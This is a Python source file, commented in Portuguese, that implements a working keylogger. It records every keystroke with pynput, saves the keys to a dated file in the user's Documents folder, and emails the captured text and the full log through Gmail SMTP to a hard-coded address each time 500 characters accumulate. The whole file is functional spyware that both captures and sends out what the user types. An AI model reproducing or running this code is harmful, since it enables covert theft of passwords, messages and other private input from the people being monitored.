import os
import re
import smtplib
import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener
from senh import senha


# Configurações do email
email = 'sharktech.desenvolvimento@gmail.com'
senha =  senha #senha do meu email de teste
servidor_smtp = 'smtp.gmail.com'
porta_smtp = 465

# Configurações do arquivo
fileLog = "keylog_"
date = datetime.datetime.now().strftime("%d-%m-%Y")
fileName = os.path.join(os.path.expanduser('~/Documents'), fileLog + date + ".txt")

# Variáveis globais
limite_caracteres_email = 500
log_buffer = ''

def processa_tecla(k):
    k = str(k)
    substituicoes = {
        r'\'': '',
        r'Key.delete': ' [DEL] ',
        r'Key.space': ' ',
        r'Key.esc': ' [ESC] ',
        r'Key.alt': ' [ALT] ',
        r'Key.ctrl': ' [CTRL] ',
        r'Key.shift': ' [SHIFT] ',
        r'Key.enter': '\n',
        r'Key.backspace': ' [BCKSPC] ',
        r'Key.tab': ' [TAB] '
    }
    for padrao, substituicao in substituicoes.items():
        k = re.sub(padrao, substituicao, k)
    return k

def salva_local(k):
    try:
        with open(fileName, "a", encoding='utf-8', errors='replace') as log:
            log.write(k)
    except Exception as e:
        print(f"Erro ao salvar localmente: {str(e)}")

def envia_email():
    global log_buffer
    try:
        if not log_buffer:
            return

        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = f"Keylogger Log - {datetime.datetime.now().strftime('%d/%m/%Y %H:%M')}"
        
        # Lê o arquivo com tratamento de erros de codificação
        try:
            with open(fileName, "rb") as f:
                conteudo = f.read().decode('utf-8', errors='replace')
        except Exception as e:
            conteudo = f"Erro ao ler arquivo: {str(e)}"
        
        corpo = f"Últimas teclas:\n{log_buffer}\n\nLog completo:\n{conteudo}"
        msg.attach(MIMEText(corpo, 'plain', 'utf-8'))
        
        with smtplib.SMTP_SSL(servidor_smtp, porta_smtp) as servidor:
            servidor.login(email, senha)
            servidor.sendmail(email, email, msg.as_string())
            print("Log enviado por email com sucesso!")
            
        log_buffer = ''
    except Exception as e:
        print(f"Erro ao enviar email: {str(e)}")

def on_press(key):
    global log_buffer
    try:
        tecla_processada = processa_tecla(key)
        log_buffer += tecla_processada
        salva_local(tecla_processada)
        
        if len(log_buffer) >= limite_caracteres_email:
            envia_email()
            
    except Exception as e:
        print(f"Erro: {str(e)}")

# Inicialização
if not os.path.exists(fileName):
    with open(fileName, "w", encoding='utf-8') as f:
        f.write("Início do log em: " + datetime.datetime.now().strftime('%d/%m/%Y %H:%M') + "\n\n")

print(f"Monitorando teclado. Arquivo: {fileName}")
with Listener(on_press=on_press) as listener:
    listener.join()